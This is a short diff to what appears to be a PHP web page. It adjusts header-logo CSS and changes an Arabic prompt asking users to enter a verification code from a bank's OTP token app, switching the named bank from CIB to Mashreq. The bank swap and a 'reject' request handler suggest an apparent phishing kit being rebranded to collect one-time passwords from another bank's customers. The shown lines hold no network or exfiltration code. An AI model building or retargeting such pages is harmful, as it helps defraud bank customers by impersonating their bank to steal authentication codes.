@@ -100,13 +100,7 @@ if (isset($_GET['reject'])) {
             background: radial-gradient(circle, rgba(255, 220, 180, 0.18) 0%, transparent 65%);
         }
 
-        .header-logo {
-            width: 100px;
-            height: auto;
-            margin-bottom: 14px;
-            position: relative;
-            z-index: 1;
-        }
+      
 
         .header-icon {
             width: 60px;
@@ -171,8 +165,7 @@ if (isset($_GET['reject'])) {
 .header-logo {
     width: 100%;
     height: 100%;
-    object-fit: contain;
-    padding: 8px;
+    object-fit: cover;
     display: block;
 }
 
@@ -453,7 +446,7 @@ if (isset($_GET['reject'])) {
                 </svg>
             </div>
             <div class="header-title">التحقق الإضافي</div>
-            <div class="header-sub">يرجى الحصول على رمز التحقق من تطبيق<br>CIB OTP Token وإدخاله أدناه</div>
+            <div class="header-sub">يرجى الحصول على رمز التحقق من تطبيق<br>Mashreq OTP Token وإدخاله أدناه</div>
         </div>
 
         <div class="content">
